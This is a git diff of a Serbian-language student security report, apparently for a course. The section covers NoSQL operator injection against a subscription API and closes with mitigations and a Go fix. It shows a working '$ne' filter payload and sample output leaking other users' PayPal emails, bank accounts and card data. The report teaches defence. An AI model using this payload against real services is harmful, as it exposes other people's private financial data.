@@ -103,46 +103,204 @@ Rade@Yoga D:\fax\MAS\ZOSS\zoss-predavanje\mongobleed-demo ( main): py .\mongo
 - Onemogućavanje zlib kompresije: Ako ažuriranje nije moguće, u konfiguraciji onemogućiti `zlib` kao mrežni kompresor.
 - Mrežna segmentacija: Ograničiti pristup MongoDB portu (27017) samo na trusted IP adrese (backend servise).
 
-2. NoSQL Injection via Operator Injection
-Pretnje (Resursi)
-Resursi pod rizikom:
-
-Poverljivost svih pretplata u bazi.
-
-Izolacija podataka među korisnicima (Multi-tenancy).
-
+### 2) NoSQL Injection via Operator Injection
 Ranjivost nastaje kada Subscription Service prima filtere od korisnika (obično preko Query parametara) i direktno ih prosleđuje MongoDB-u bez sanitizacije. Umesto prostog stringa, napadač šalje JSON objekat sa logičkim operatorima.
 
-Napadi
-Scenario: Neovlašćeni pristup celokupnoj bazi pretplata
-Normalan zahtev korisnika USR001 vraća samo njegove dve pretplate:
-GET /my-subscriptions?filter={"user_id":"USR001"}
+#### Resursi pod rizikom:
+- Poverljivost svih pretplata u bazi.
+- Izolacija podataka među korisnicima (Multi-tenancy).
 
-Napad:
-Napadač šalje zahtev sa operatorom $ne (not equal):
-GET /my-subscriptions?filter={"user_id":{"$ne":null}}
+#### Napad
+- Scenario: Neovlašćeni pristup celokupnoj bazi pretplata
+- Normalan zahtev korisnika sa id-em `USR001` vraća samo njegove dve pretplate:
+  - `GET /my-subscriptions?filter={"user_id":"USR001"}`
+```json
+[
+  {
+    "_id": "699832059945e3e7b79dc2a1",
+    "auto_renew": true,
+    "currency": "RSD",
+    "payment_info": {
+      "card_last4": "1234",
+      "card_type": "Visa",
+      "transaction_id": "TXN123456789"
+    },
+    "payment_method": "credit_card",
+    "plan": "monthly_unlimited",
+    "price": 2500,
+    "status": "active",
+    "subscription_id": "SUB001",
+    "type": "city_transport",
+    "user_id": "USR001",
+    "valid_from": "2024-04-01T00:00:00Z",
+    "valid_until": "2024-04-30T00:00:00Z",
+    "zones": [
+      "zone_a",
+      "zone_b"
+    ]
+  },
+  {
+    "_id": "699832059945e3e7b79dc2a4",
+    "auto_renew": true,
+    "credits": 2000,
+    "currency": "RSD",
+    "payment_info": {
+      "paypal_email": "marko.jovanovic@email.com",
+      "transaction_id": "PPAY123456"
+    },
+    "payment_method": "paypal",
+    "plan": "taxi_premium",
+    "price": 5500,
+    "remaining_credits": 2000,
+    "status": "active",
+    "subscription_id": "SUB004",
+    "type": "taxi_credits",
+    "user_id": "USR001",
+    "valid_from": "2024-04-01T00:00:00Z",
+    "valid_until": "2024-07-01T00:00:00Z"
+  }
+]
+```
 
-Ishod:
-Backend generiše MongoDB upit koji glasi: "Vrati sve zapise gde user_id nije null".
+- Napadač šalje zahtev sa operatorom `$ne` (not equal):
+  - `GET /my-subscriptions?filter={"user_id":{"$ne":null}}`
+```json
+[
+  {
+    "_id": "699832059945e3e7b79dc2a1",
+    "auto_renew": true,
+    "currency": "RSD",
+    "payment_info": {
+      "card_last4": "1234",
+      "card_type": "Visa",
+      "transaction_id": "TXN123456789"
+    },
+    "payment_method": "credit_card",
+    "plan": "monthly_unlimited",
+    "price": 2500,
+    "status": "active",
+    "subscription_id": "SUB001",
+    "type": "city_transport",
+    "user_id": "USR001",
+    "valid_from": "2024-04-01T00:00:00Z",
+    "valid_until": "2024-04-30T00:00:00Z",
+    "zones": [
+      "zone_a",
+      "zone_b"
+    ]
+  },
+  {
+    "_id": "699832059945e3e7b79dc2a4",
+    "auto_renew": true,
+    "credits": 2000,
+    "currency": "RSD",
+    "payment_info": {
+      "paypal_email": "marko.jovanovic@email.com",
+      "transaction_id": "PPAY123456"
+    },
+    "payment_method": "paypal",
+    "plan": "taxi_premium",
+    "price": 5500,
+    "remaining_credits": 2000,
+    "status": "active",
+    "subscription_id": "SUB004",
+    "type": "taxi_credits",
+    "user_id": "USR001",
+    "valid_from": "2024-04-01T00:00:00Z",
+    "valid_until": "2024-07-01T00:00:00Z"
+  },
+  {
+    "_id": "699832059945e3e7b79dc2a2",
+    "auto_renew": false,
+    "currency": "RSD",
+    "payment_info": {
+      "bank_account": "160-123456-78",
+      "reference_number": "REF2024001"
+    },
+    "payment_method": "bank_transfer",
+    "plan": "annual_unlimited",
+    "price": 24000,
+    "status": "active",
+    "subscription_id": "SUB002",
+    "type": "city_transport",
+    "user_id": "USR002",
+    "valid_from": "2024-01-01T00:00:00Z",
+    "valid_until": "2024-12-31T00:00:00Z",
+    "zones": [
+      "zone_a",
+      "zone_b",
+      "zone_c"
+    ]
+  },
+  {
+    "_id": "699832059945e3e7b79dc2a5",
+    "auto_renew": false,
+    "benefits": {
+      "city_transport": {
+        "type": "monthly_unlimited",
+        "zones": [
+          "zone_a",
+          "zone_b"
+        ]
+      },
+      "taxi_credits": 300,
+      "bike_sharing": "unlimited_30min"
+    },
+    "currency": "RSD",
+    "payment_info": {
+      "card_last4": "9012",
+      "card_type": "Visa",
+      "transaction_id": "TXN11223344"
+    },
+    "payment_method": "credit_card",
+    "plan": "mobility_plus",
+    "price": 6500,
+    "remaining_taxi_credits": 200,
+    "status": "expired",
+    "subscription_id": "SUB005",
+    "type": "combined",
+    "user_id": "USR002",
+    "valid_from": "2024-03-01T00:00:00Z",
+    "valid_until": "2024-04-01T00:00:00Z"
+  },
+  {
+    "_id": "699832059945e3e7b79dc2a3",
+    "auto_renew": false,
+    "credits": 500,
+    "currency": "RSD",
+    "payment_info": {
+      "card_last4": "5678",
+      "card_type": "Mastercard",
+      "transaction_id": "TXN987654321"
+    },
+    "payment_method": "credit_card",
+    "plan": "taxi_starter",
+    "price": 1500,
+    "remaining_credits": 350,
+    "status": "active",
+    "subscription_id": "SUB003",
+    "type": "taxi_credits",
+    "user_id": "USR003", // id usera čiji podaci bi trebali da ostanu nedostupni
+    "valid_from": "2024-03-15T00:00:00Z",
+    "valid_until": "2024-06-15T00:00:00Z"
+  },
+ // ...
+```
 
-Sistem vraća pretplate korisnika USR002, USR003, USR004.
+- Backend generiše MongoDB upit koji glasi: "Vrati sve zapise gde user_id nije null".
+- Sistem vraća pretplate korisnika `USR002`, `USR003`, `USR004`.
+- Napadač dobija uvid u tuđe paypal_email adrese, brojeve bankovnih računa (bank_account) i transaction_id.
 
-Napadač dobija uvid u tuđe paypal_email adrese, brojeve bankovnih računa (bank_account) i transaction_id.
+#### Mitigacije
+- Strogo tipiziranje (Schema Binding): Ne dozvoliti direktno bind-ovanje filtera u `bson.M.` Koristiti fiksne strukture u Go-u gde je UserID isključivo tipa string.
+- Sanitizacija inputa: Implementirati middleware koji uklanja MongoDB operatore (koji počinju sa $) iz korisničkog inputa.
+- Primenjivanje vlasništva u kodu: U handler-u uvek forsirati user_id izvučen iz JWT tokena:
 
-Mitigacije
-Strogo tipiziranje (Schema Binding): Ne dozvoliti direktno bind-ovanje filtera u bson.M. Koristiti fiksne strukture u Go-u gde je UserID isključivo tipa string.
-
-Sanitizacija inputa: Implementirati middleware koji uklanja MongoDB operatore (koji počinju sa $) iz korisničkog inputa.
-
-Primenjivanje vlasništva u kodu: U handler-u uvek forsirati user_id izvučen iz JWT tokena:
-
-Go
-// Pogrešno:
+```go
+// wrong
 filter := c.Query("filter") 
 
-// Ispravno:
-userID, _ := c.Get("user_id") // Iz auth middleware-a
-finalFilter := bson.M{"user_id": userID} // Ignoriši filtere iz request-a za polje user_id
-Praktična demonstracija
-Za detaljan prikaz sprovedenog MongoBleed napada i rezultate NoSQL Injection eksploatacije, pogledati dokumentaciju u folderu:
-📍 D:\fax\MAS\ZOSS\zoss-predavanje\mongobleed-demo
+// right:
+userID, _ := c.Get("user_id") 
+finalFilter := bson.M{"user_id": userID} 
+```
